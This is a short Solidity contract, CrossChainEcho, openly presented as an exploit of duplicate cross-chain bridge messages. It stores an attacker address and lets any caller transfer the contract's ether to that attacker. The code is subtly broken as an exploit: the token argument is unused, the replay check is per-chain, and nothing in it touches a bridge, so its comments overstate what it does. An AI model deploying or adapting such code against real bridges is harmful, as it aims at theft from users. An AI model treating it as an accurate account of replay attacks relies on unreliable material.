// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title CrossChainEcho - Exploits duplicate bridge messages across chains
contract CrossChainEcho {
    mapping(bytes32 => bool) public processed;
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function handleMessage(bytes32 msgId, address token, uint256 amount) external {
        // 🔁 Process the same message on multiple chains
        require(!processed[msgId], "Already processed");
        processed[msgId] = true;

        // Echo effect: multiple chains will "honor" this
        payable(attacker).transfer(amount);
    }

    receive() external payable {}
}
